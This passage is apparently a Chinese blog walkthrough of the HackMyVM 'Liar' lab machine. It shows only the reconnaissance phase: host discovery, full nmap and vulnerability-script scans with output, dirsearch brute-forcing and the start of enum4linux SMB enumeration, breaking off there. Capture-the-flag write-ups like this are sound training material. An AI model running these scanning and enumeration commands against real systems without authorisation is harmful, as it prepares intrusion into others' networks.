<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM - Liar">
<meta property="og:url" content="https://z9m8r8.github.io/2024/10/17/Liar/index.html">
<meta property="og:site_name" content="Phantom&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-10-16T16:00:00.000Z">
<meta property="article:modified_time" content="2024-10-17T14:11:24.461Z">
<meta property="article:author" content="Phantom">
<meta property="article:tag" content="信息收集">
<meta property="article:tag" content="反弹 shell">
<meta property="article:tag" content="HackMyVM">
<meta property="article:tag" content="medusa">
<meta property="article:tag" content="hydra">
<meta property="article:tag" content="crackmapexec">
<meta property="article:tag" content="WinRM">
<meta property="article:tag" content="Evil-Winrm">
<meta property="article:tag" content="RunasCs">
<meta property="article:tag" content="Windows">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2024/10/17/Liar/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/10/17/Liar/","path":"2024/10/17/Liar/","title":"HackMyVM - Liar"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HackMyVM - Liar | Phantom's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Phantom's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smb-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.4. SMB 信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#winrm"><span class="nav-text">1.5. WinRM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text">2.3. 补充</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">3. 参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Phantom"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Phantom</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">176</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">163</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/10/17/Liar/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Phantom">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Phantom's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HackMyVM - Liar | Phantom's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackMyVM - Liar
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-10-17 00:00:00 / 修改时间：22:11:24" itemprop="dateCreated datePublished" datetime="2024-10-17T00:00:00+08:00">2024-10-17</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.7k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>21 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p>靶机：<a
target="_blank" rel="noopener" href="https://hackmyvm.eu/machines/machine.php?vm=Liar">HackMyVM |
Liar</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth1 -r 10.0.3.0/24</span><br></pre></td></tr></table></figure>
<p>靶机：10.0.3.29</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 10.0.3.29 -p-        </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 08:41 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.29</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">MAC Address: 08:00:27:6C:C0:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 92.27 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sU --top-ports=&quot;1000&quot; 10.0.3.29</span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 09:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.29</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 993 closed udp ports (port-unreach)</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">123/udp  open|filtered ntp</span><br><span class="line">137/udp  open          netbios-ns</span><br><span class="line">138/udp  open|filtered netbios-dgm</span><br><span class="line">500/udp  open|filtered isakmp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">5353/udp open|filtered zeroconf</span><br><span class="line">5355/udp open|filtered llmnr</span><br><span class="line">MAC Address: 08:00:27:6C:C0:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1066.95 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sC -sV -T4 -A -p- --defeat-rst-ratelimit --script=vuln -oN nmap_result.txt --min-rate=300 --max-retries=3 10.0.3.29 </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 10:14 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.29</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">135/tcp   open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds?</span></span><br><span class="line"><span class="string">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">49664/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49665/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49667/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49668/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49669/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:6C:C0:01 (Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></span><br><span class="line"><span class="string">TCP/IP fingerprint:</span></span><br><span class="line"><span class="string">OS:SCAN(V=7.94SVN%E=4%D=10/16%OT=80%CT=1%CU=35598%PV=Y%DS=1%DC=D%G=Y%M=0800</span></span><br><span class="line"><span class="string">OS:27%TM=670FCB6C%P=x86_64-pc-linux-gnu)SEQ(SP=F4%GCD=1%ISR=10B%TI=I%CI=I%I</span></span><br><span class="line"><span class="string">OS:I=I%SS=S%TS=U)SEQ(SP=F5%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M5</span></span><br><span class="line"><span class="string">OS:B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5B4NW8NNS%O6=M5B4NNS</span></span><br><span class="line"><span class="string">OS:)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W</span></span><br><span class="line"><span class="string">OS:=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y</span></span><br><span class="line"><span class="string">OS:%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR</span></span><br><span class="line"><span class="string">OS:%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80</span></span><br><span class="line"><span class="string">OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q</span></span><br><span class="line"><span class="string">OS:=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164</span></span><br><span class="line"><span class="string">OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   1.74 ms 10.0.3.29</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 289.95 seconds&#x27;</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sV -p 139,445 -A --script=smb-enum-shares -oN nmap_smb_result.txt 10.0.3.29 </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-16 10:23 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.29</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">MAC Address: 08:00:27:6C:C0:01 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows Server 2012 R2 Update 1 (94%), Microsoft Windows Server 2016 build 10586 - 14393 (94%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (94%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1709 - 1909 (94%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (93%), Microsoft Windows Vista SP1 (93%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.27 ms 10.0.3.29</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.44 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 主页拿到个用户名 <code>nica</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410171816952.jpg" /></p>
<p>目录扫描，未扫到有用信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.29/&quot;</span>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,asp,config,aspx -f -t 50 2&gt;&amp;/dev/null</span><br><span class="line"></span><br><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.29/&quot;</span>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,html,htm -f -t 50 2&gt;&amp;/dev/null</span><br><span class="line"></span><br><span class="line">dirsearch -u <span class="string">&quot;http://10.0.3.29/cgi-bin/&quot;</span> -e cgi,sh,pl,zip,txt,bak,aspx,asp -f -t 50 2&gt;&amp;/dev/null</span><br></pre></td></tr></table></figure>
<h3 id="smb-信息收集">1.4. SMB 信息收集</h3>
<p>扫 SMB</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># enum4linux -a 10.0.3.29</span></span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Oct 17 05:00:05 2024</span><br><span class="line"></span><br><span class="line"> =========================================( Target Information )=========================================</span><br><span class="line"></span><br><span class="line">Target ........... 10.0.3.29</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span 